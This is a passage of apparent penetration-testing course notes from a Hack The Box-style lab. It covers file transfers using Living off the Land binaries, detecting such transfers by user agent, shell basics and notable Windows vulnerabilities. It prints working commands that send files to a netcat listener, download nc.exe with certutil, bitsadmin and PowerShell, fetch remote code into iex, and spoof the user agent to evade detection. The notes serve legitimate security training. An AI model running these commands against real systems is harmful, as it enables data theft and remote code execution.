</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/18/2020</span><span class="w">  </span><span class="nx">12:19</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">1724</span><span class="w"> </span><span class="nx">scan-results.txt</span><span class="w">
</span><span class="nt">-a</span><span class="o">----</span><span class="w">        </span><span class="mi">11</span><span class="n">/18/2020</span><span class="w">  </span><span class="nx">12:20</span><span class="w"> </span><span class="nx">PM</span><span class="w">           </span><span class="nx">3448</span><span class="w"> </span><span class="nx">scan-results.txt.aes</span><span class="w">
</span></code></pre></div></div>

<h2 id="file-encryption-on-linux">File Encryption on Linux</h2>

<p><a href="https://www.openssl.org/">OpenSSL</a> is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files “nc style” to encrypt files.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl enc <span class="nt">-aes256</span> <span class="nt">-iter</span> 100000 <span class="nt">-pbkdf2</span> <span class="nt">-in</span> /etc/passwd <span class="nt">-out</span> passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:  
</code></pre></div></div>

<h4 id="decrypt-passwdenc-with-openssl">Decrypt passwd.enc with openssl</h4>

<p>Protected File Transfers</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl enc <span class="nt">-d</span> <span class="nt">-aes256</span> <span class="nt">-iter</span> 100000 <span class="nt">-pbkdf2</span> <span class="nt">-in</span> passwd.enc <span class="nt">-out</span> passwd                    

enter aes-256-cbc decryption password:
</code></pre></div></div>

<h1 id="living-off-the-land">Living off The Land</h1>

<p>The phrase “Living off the land” was coined by Christopher Campbell <a href="https://twitter.com/obscuresec">@obscuresec</a> &amp; Matt Graeber <a href="https://twitter.com/mattifestation">@mattifestation</a> at <a href="https://www.youtube.com/watch?v=j-r6UonEkUw">DerbyCon 3</a>.</p>

<p>The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that an attacker can use to perform actions beyond their original purpose. There are currently two websites that aggregate information on Living off the Land binaries:</p>

<ul>
  <li><a href="https://lolbas-project.github.io">LOLBAS Project for Windows Binaries</a></li>
  <li><a href="https://gtfobins.github.io/">GTFOBins for Linux Binaries</a></li>
</ul>

<p>Living off the Land binaries can be used to perform functions such as:</p>

<ul>
  <li>Download</li>
  <li>Upload</li>
  <li>Command Execution</li>
  <li>File Read</li>
  <li>File Write</li>
  <li>Bypasses</li>
</ul>

<p>This section will focus on using LOLBAS and GTFOBins projects and provide examples for download and upload functions on Windows &amp; Linux systems.</p>

<hr />

<h2 id="using-the-lolbas-and-gtfobins-project">Using the LOLBAS and GTFOBins Project</h2>

<p><a href="https://lolbas-project.github.io/#">LOLBAS for Windows</a> and <a href="https://gtfobins.github.io/">GTFOBins for Linux</a> are websites where we can search for binaries we can use for different functions.</p>

<h3 id="lolbas">LOLBAS</h3>
<p>#lolbas</p>

<p>To search for download and upload functions in <a href="https://lolbas-project.github.io/">LOLBAS</a> we can use <code class="language-plaintext highlighter-rouge">/download</code> or <code class="language-plaintext highlighter-rouge">/upload</code>.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/24/lolbas_upload.jpg" alt="LOLBAS project page listing binaries like CertReq.exe with functions and ATT&amp;CK techniques." /></p>

<p>Let’s use <a href="https://lolbas-project.github.io/lolbas/Binaries/Certreq/">CertReq.exe</a> as an example.</p>

<p>We need to listen on a port on our attack host for incoming traffic using Netcat and then execute certreq.exe to upload a file.</p>

<h4 id="upload-winini-to-our-pwnbox">Upload win.ini to our Pwnbox</h4>

<p>Living off The Land</p>

<pre><code class="language-cmd">C:\htb&gt; certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
</code></pre>

<p>This will send the file to our Netcat session, and we can copy-paste its contents.</p>

<h4 id="file-received-in-our-netcat-session">File Received in our Netcat Session</h4>

<p>Living off The Land</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 8000

listening on <span class="o">[</span>any] 8000 ...
connect to <span class="o">[</span>192.168.49.128] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.49.1] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 <span class="o">(</span>compatible<span class="p">;</span> Win32<span class="p">;</span> NDES client 10.0.19041.1466/vb_release_svc_prod1<span class="o">)</span>
Content-Length: 92
Host: 192.168.49.128:8000

<span class="p">;</span> <span class="k">for </span>16-bit app support
<span class="o">[</span>fonts]
<span class="o">[</span>extensions]
<span class="o">[</span>mci extensions]
<span class="o">[</span>files]
<span class="o">[</span>Mail]
<span class="nv">MAPI</span><span class="o">=</span>1
</code></pre></div></div>

<p>If you get an error when running <code class="language-plaintext highlighter-rouge">certreq.exe</code>, the version you are using may not contain the <code class="language-plaintext highlighter-rouge">-Post</code> parameter. You can download an updated version <a href="https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe">here</a> and try again.</p>

<h3 id="gtfobins">GTFOBins</h3>

<p>To search for the download and upload function in <a href="https://gtfobins.github.io/">GTFOBins for Linux Binaries</a>, we can use <code class="language-plaintext highlighter-rouge">+file download</code> or <code class="language-plaintext highlighter-rouge">+file upload</code>.</p>

<p><img src="https://academy.hackthebox.com/storage/modules/24/gtfobins_download.jpg" alt="GTFObins page listing Unix binaries with functions like file upload and download, and associated ATT&amp;CK techniques." /></p>

<p>Let’s use <a href="https://www.openssl.org/">OpenSSL</a>. It’s frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks. OpenSSL can be used to send files “nc style.”</p>

<p>We need to create a certificate and start a server in our Pwnbox.</p>

<h4 id="create-certificate-in-our-pwnbox">Create Certificate in our Pwnbox</h4>

<p>Living off The Land</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl req <span class="nt">-newkey</span> rsa:2048 <span class="nt">-nodes</span> <span class="nt">-keyout</span> key.pem <span class="nt">-x509</span> <span class="nt">-days</span> 365 <span class="nt">-out</span> certificate.pem

Generating a RSA private key
.......................................................................................................+++++
................+++++
writing new private key to <span class="s1">'key.pem'</span>
<span class="nt">-----</span>
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter <span class="s1">'.'</span>, the field will be left blank.
<span class="nt">-----</span>
Country Name <span class="o">(</span>2 letter code<span class="o">)</span> <span class="o">[</span>AU]:
State or Province Name <span class="o">(</span>full name<span class="o">)</span> <span class="o">[</span>Some-State]:
Locality Name <span class="o">(</span>eg, city<span class="o">)</span> <span class="o">[]</span>:
Organization Name <span class="o">(</span>eg, company<span class="o">)</span> <span class="o">[</span>Internet Widgits Pty Ltd]:
Organizational Unit Name <span class="o">(</span>eg, section<span class="o">)</span> <span class="o">[]</span>:
Common Name <span class="o">(</span>e.g. server FQDN or YOUR name<span class="o">)</span> <span class="o">[]</span>:
Email Address <span class="o">[]</span>:
</code></pre></div></div>

<h4 id="stand-up-the-server-in-our-pwnbox">Stand up the Server in our Pwnbox</h4>

<p>Living off The Land</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl s_server <span class="nt">-quiet</span> <span class="nt">-accept</span> 80 <span class="nt">-cert</span> certificate.pem <span class="nt">-key</span> key.pem &lt; /tmp/LinEnum.sh
</code></pre></div></div>

<p>Next, with the server running, we need to download the file from the compromised machine.</p>

<h4 id="download-file-from-the-compromised-machine">Download File from the Compromised Machine</h4>

<p>Living off The Land</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 10.10.10.32:80 <span class="nt">-quiet</span> <span class="o">&gt;</span> LinEnum.sh
</code></pre></div></div>

<hr />

<h2 id="other-common-living-off-the-land-tools">Other Common Living off the Land tools</h2>

<h3 id="bitsadmin-download-function">Bitsadmin Download function</h3>

<p>The <a href="https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal">Background Intelligent Transfer Service (BITS)</a> can be used to download files from HTTP sites and SMB shares. It “intelligently” checks host and network utilization into account to minimize the impact on a user’s foreground work.</p>

<h4 id="file-download-with-bitsadmin">File Download with Bitsadmin</h4>

<p>Living off The Land</p>

<pre><code class="language-powershell-session">PS C:\htb&gt; bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
</code></pre>

<p>PowerShell also enables interaction with BITS, enables file downloads and uploads, supports credentials, and can use specified proxy servers.</p>

<h4 id="download">Download</h4>

<p>Living off The Land</p>

<pre><code class="language-powershell-session">PS C:\htb&gt; Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
</code></pre>

<hr />

<h3 id="certutil">Certutil</h3>

<p>Casey Smith (<a href="https://twitter.com/subtee?lang=en">@subTee</a>) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto <code class="language-plaintext highlighter-rouge">wget</code> for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.</p>

<h4 id="download-a-file-with-certutil">Download a File with Certutil</h4>

<p>Living off The Land</p>

<pre><code class="language-cmd">C:\htb&gt; certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
</code></pre>
<hr />

<h1 id="detection">Detection</h1>

<p>Command-line detection based on blacklisting is straightforward to bypass, even using simple case obfuscation. However, although the process of whitelisting all command lines in a particular environment is initially time-consuming, it is very robust and allows for quick detection and alerting on any unusual command lines.</p>

<p>Most client-server protocols require the client and server to negotiate how content will be delivered before exchanging information. This is common with the <code class="language-plaintext highlighter-rouge">HTTP</code> protocol. There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which <code class="language-plaintext highlighter-rouge">HTTP</code> client is connecting to it, for example, Firefox, Chrome, etc.</p>

<p>User agents are not only used to identify web browsers, but anything acting as an <code class="language-plaintext highlighter-rouge">HTTP</code> client and connecting to a web server via <code class="language-plaintext highlighter-rouge">HTTP</code> can have a user agent string (i.e., <code class="language-plaintext highlighter-rouge">cURL</code>, a custom <code class="language-plaintext highlighter-rouge">Python</code> script, or common tools such as <code class="language-plaintext highlighter-rouge">sqlmap</code>, or <code class="language-plaintext highlighter-rouge">Nmap</code>).</p>

<p>Organizations can take some steps to identify potential user agent strings by first building a list of known legitimate user agent strings, user agents used by default operating system processes, common user agents used by update services such as Windows Update, and antivirus updates, etc. These can be fed into a SIEM tool used for threat hunting to filter out legitimate traffic and focus on anomalies that may indicate suspicious behavior. Any suspicious-looking user agent strings can then be further investigated to determine whether they were used to perform malicious actions. This <a href="http://useragentstring.com/index.php">website</a> is handy for identifying common user agent strings. A list of user agent strings is available <a href="http://useragentstring.com/pages/useragentstring.php">here</a>.</p>

<p>Malicious file transfers can also be detected by their user agents. The following user agents/headers were observed from common <code class="language-plaintext highlighter-rouge">HTTP</code> transfer techniques (tested on Windows 10, version 10.0.14393, with PowerShell 5).</p>

<h4 id="invoke-webrequest---client">Invoke-WebRequest - Client</h4>

<p>Detection</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nx">http://10.10.10.32/nc.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s2">"C:\Users\Public\nc.exe"</span><span class="w"> 
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-RestMethod</span><span class="w"> </span><span class="nx">http://10.10.10.32/nc.exe</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s2">"C:\Users\Public\nc.exe"</span><span class="w">
</span></code></pre></div></div>

<h4 id="invoke-webrequest---server">Invoke-WebRequest - Server</h4>

<p>Detection</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT<span class="p">;</span> Windows NT 10.0<span class="p">;</span> en-US<span class="o">)</span> WindowsPowerShell/5.1.14393.0
</code></pre></div></div>

<h4 id="winhttprequest---client">WinHttpRequest - Client</h4>

<p>Detection</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$h</span><span class="o">=</span><span class="n">new-object</span><span class="w"> </span><span class="nt">-com</span><span class="w"> </span><span class="nx">WinHttp.WinHttpRequest.5.1</span><span class="p">;</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$h</span><span class="o">.</span><span class="nf">open</span><span class="p">(</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'http://10.10.10.32/nc.exe'</span><span class="p">,</span><span class="bp">$false</span><span class="p">);</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$h</span><span class="o">.</span><span class="nf">send</span><span class="p">();</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="nv">$h</span><span class="o">.</span><span class="nf">ResponseText</span><span class="w">
</span></code></pre></div></div>

<p>Detection</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /nc.exe HTTP/1.1
Accept: <span class="k">*</span>/<span class="k">*</span>
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: <span class="nb">gzip</span>, deflate
User-Agent: Mozilla/4.0 <span class="o">(</span>compatible<span class="p">;</span> MSIE 7.0<span class="p">;</span> Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="p">;</span> Trident/7.0<span class="p">;</span> .NET4.0C<span class="p">;</span> .NET4.0E<span class="o">)</span>
</code></pre></div></div>

<h4 id="certutil---client">Certutil - Client</h4>

<p>Detection</p>

<pre><code class="language-cmd">C:\htb&gt; certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb&gt; certutil -verifyctl -split -f http://10.10.10.32/nc.exe
</code></pre>

<h3 id="changing-user-agent-in-powershell">Changing user agent in Powershell</h3>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="p">[</span><span class="n">Microsoft.PowerShell.Commands.PSUserAgent</span><span class="p">]</span><span class="o">.</span><span class="nf">GetProperties</span><span class="p">()</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nx">Select-Object</span><span class="w"> </span><span class="nx">Name</span><span class="p">,@{</span><span class="nx">label</span><span class="o">=</span><span class="s2">"User Agent"</span><span class="p">;</span><span class="nx">Expression</span><span class="o">=</span><span class="p">{[</span><span class="n">Microsoft.PowerShell.Commands.PSUserAgent</span><span class="p">]::</span><span class="err">$</span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Name</span><span class="p">)}}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">

</span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">InternetExplorer</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Mozilla/5.0</span><span class="w"> </span><span class="p">(</span><span class="n">compatible</span><span class="p">;</span><span class="w"> </span><span class="n">MSIE</span><span class="w"> </span><span class="nx">9.0</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">en-US</span><span class="p">)</span><span class="w">

</span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">FireFox</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Mozilla/5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">en-US</span><span class="p">)</span><span class="w"> </span><span class="nx">Gecko/20100401</span><span class="w"> </span><span class="nx">Firefox/4.0</span><span class="w">

</span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Chrome</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Mozilla/5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">en-US</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit/534.6</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Chrome/7.0.500.0</span><span class="w">
             </span><span class="n">Safari/534.6</span><span class="w">

</span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Opera</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Opera/9.70</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">en-US</span><span class="p">)</span><span class="w"> </span><span class="nx">Presto/2.2.1</span><span class="w">

</span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">Safari</span><span class="w">
</span><span class="n">User</span><span class="w"> </span><span class="nx">Agent</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">Mozilla/5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="p">;</span><span class="w"> </span><span class="n">Windows</span><span class="w"> </span><span class="nx">NT</span><span class="w"> </span><span class="nx">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">en-US</span><span class="p">)</span><span class="w"> </span><span class="nx">AppleWebKit/533.16</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="nx">like</span><span class="w"> </span><span class="nx">Gecko</span><span class="p">)</span><span class="w"> </span><span class="nx">Version/5.0</span><span class="w">
             </span><span class="n">Safari/533.16</span><span class="w">
</span></code></pre></div></div>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$UserAgent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Microsoft.PowerShell.Commands.PSUserAgent</span><span class="p">]::</span><span class="n">Chrome</span><span class="w">
</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\htb</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-WebRequest</span><span class="w"> </span><span class="nx">http://10.10.10.32/nc.exe</span><span class="w"> </span><span class="nt">-UserAgent</span><span class="w"> </span><span class="nv">$UserAgent</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s2">"C:\Users\Public\nc.exe"</span><span class="w">
</span></code></pre></div></div>

<p>as you can see .. User is different now:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c0derpwner@htb[/htb]<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 80

listening on <span class="o">[</span>any] 80 ...
connect to <span class="o">[</span>10.10.10.32] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT<span class="p">;</span> Windows NT 10.0<span class="p">;</span> en-US<span class="o">)</span> AppleWebKit/534.6
<span class="o">(</span>KHTML, Like Gecko<span class="o">)</span> Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
</code></pre></div></div>

<hr />

<p>A <code class="language-plaintext highlighter-rouge">shell</code> is a program that provides a computer user with an interface to input instructions into the system and view text output (Bash, Zsh, cmd, and PowerShell, for example). As penetration testers and information security professionals, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host.</p>

<h2 id="why-get-a-shell">Why Get a Shell?</h2>

<p>Remember that the shell gives us direct access to the <code class="language-plaintext highlighter-rouge">OS</code>, <code class="language-plaintext highlighter-rouge">system commands</code>, and <code class="language-plaintext highlighter-rouge">file system</code>. So if we gain access, we can start enumerating the system for vectors that may allow us to escalate privileges, pivot, transfer files, and more. If we don’t establish a shell session, we are pretty limited on how far we can get on a target machine.</p>

<p>Every operating system has a shell, and to interact with it, we must use an application known as a <code class="language-plaintext highlighter-rouge">terminal emulator</code>. Here are some of the most common terminal emulators:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left"><strong>Terminal Emulator</strong></th>
      <th style="text-align: left"><strong>Operating System</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left"><a href="https://github.com/microsoft/terminal">Windows Terminal</a></td>
      <td style="text-align: left">Windows</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://cmder.app">cmder</a></td>
      <td style="text-align: left">Windows</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://www.putty.org">PuTTY</a></td>
      <td style="text-align: left">Windows</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://sw.kovidgoyal.net/kitty/">kitty</a></td>
      <td style="text-align: left">Windows, Linux and MacOS</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://github.com/alacritty/alacritty">Alacritty</a></td>
      <td style="text-align: left">Windows, Linux and MacOS</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://invisible-island.net/xterm/">xterm</a></td>
      <td style="text-align: left">Linux</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://en.wikipedia.org/wiki/GNOME_Terminal">GNOME Terminal</a></td>
      <td style="text-align: left">Linux</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://github.com/mate-desktop/mate-terminal">MATE Terminal</a></td>
      <td style="text-align: left">Linux</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://konsole.kde.org">Konsole</a></td>
      <td style="text-align: left">Linux</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://en.wikipedia.org/wiki/Terminal_\(macOS\)">Terminal</a></td>
      <td style="text-align: left">MacOS</td>
    </tr>
    <tr>
      <td style="text-align: left"><a href="https://iterm2.com">iTerm2</a></td>
      <td style="text-align: left">MacOS</td>
    </tr>
  </tbody>
</table>

<p>Much like a human language interpreter will translate spoken or sign language in real-time, a <code class="language-plaintext highlighter-rouge">command language interpreter</code> is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing. So when we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter.</p>

<p>Many different command language interpreters can be used, some of which are also called <code class="language-plaintext highlighter-rouge">shell scripting languages</code> or <code class="language-plaintext highlighter-rouge">Command and Scripting interpreters</code> as defined in the <a href="https://attack.mitre.org/techniques/T1059/">Execution techniques</a> of the <code class="language-plaintext highlighter-rouge">MITRE ATT&amp;CK Matrix</code>. We do not need to be software developers to understand these concepts, but the more we know, the more success we can have when attempting to exploit vulnerable systems to gain a shell session.</p>

<h4 id="bind-example">Bind Example</h4>

<p><img src="https://academy.hackthebox.com/storage/modules/115/bindshell.png" alt="Bind shell setup: Pentester's system 10.10.14.15 connects to target 10.10.14.20:1337 using netcat command." /></p>

<p>As seen in the image, we would connect directly with the <code class="language-plaintext highlighter-rouge">IP address</code> and <code class="language-plaintext highlighter-rouge">port</code> listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:</p>

<ul>
  <li>There would have to be a listener already started on the target.</li>
  <li>If there is no listener started, we would need to find a way to make this happen.</li>
  <li>Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.</li>
  <li>Operating system firewalls (on Windows &amp; Linux) will likely block most incoming connections that aren’t associated with trusted network-based applications.</li>
</ul>

<hr />

<h1 id="infiltrating-windows">Infiltrating Windows</h1>

<p>Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.</p>

<p>For example, just in the last five years, there have been <code class="language-plaintext highlighter-rouge">3688</code> reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from <a href="https://www.cvedetails.com/vendor/26/Microsoft.html">HERE</a></p>
<h2 id="prominent-windows-exploits">Prominent Windows Exploits</h2>

<p>Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let’s discuss those for a minute:</p>

<p>| <strong>Vulnerability</strong> | <strong>Description</strong>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| —————– | —————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————- |
| <code class="language-plaintext highlighter-rouge">MS08-067</code>        | MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.                                                                                                                                                                                      |
| <code class="language-plaintext highlighter-rouge">Eternal Blue</code>    | MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.                                                                                                |
| <code class="language-plaintext highlighter-rouge">PrintNightmare</code>  | A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it <a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">here</a>.                                                                                          |
| <code class="language-plaintext highlighter-rouge">BlueKeep</code>        | CVE 2019-0708 is a vulnerability in Microsoft’s RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.                                                                                                                                                                                                                                                     |
| <code class="language-plaintext highlighter-rouge">Sigred</code>          | CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain’s DNS server which is commonly the primary Domain Controller.                                                                                                                                                                                                   |
| <code class="language-plaintext highlighter-rouge">SeriousSam</code>      | CVE 2021-36934 exploits an issue with the way Windows handles permission on the <code class="language-plaintext highlighter-rouge">C:\Windows\system32\config</code> folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can’t be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. |
| <code class="language-plaintext highlighter-rouge">Zerologon</code>       | CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.              |</p>
<h2 id="bats-dlls--msi-files-oh-my">Bats, DLLs, &amp; MSI Files, Oh My!</h2>

<p>When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.</p>

<h4 id="payload-types-to-consider">Payload Types to Consider</h4>

<ul>
  <li>
